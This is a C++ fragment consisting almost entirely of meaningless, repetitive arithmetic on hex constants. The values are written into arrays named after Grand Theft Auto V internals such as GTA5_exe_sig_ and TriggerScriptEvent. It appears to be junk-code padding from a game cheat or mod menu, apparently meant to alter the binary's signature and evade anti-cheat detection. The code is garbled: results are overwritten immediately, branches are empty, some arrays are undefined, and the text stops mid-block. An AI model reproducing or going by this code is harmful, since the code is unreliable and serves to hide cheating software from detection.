		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = ponteiro * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
		offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (matriz[1] > aaaaaa)
		{
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		a = 0.0f;
		b = 0.0f;
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = 0xB2 * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
		matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
		matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		if (matriz[1] > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		a = 0.0f;
		b = 0.0f;
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
		GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (5) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		a = 0.0f;
		b = 0.0f;
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
		TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		Extern_Reader::INIFile::INIFilePath = ININame;

		if (offset > aaaaaa)
		{
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
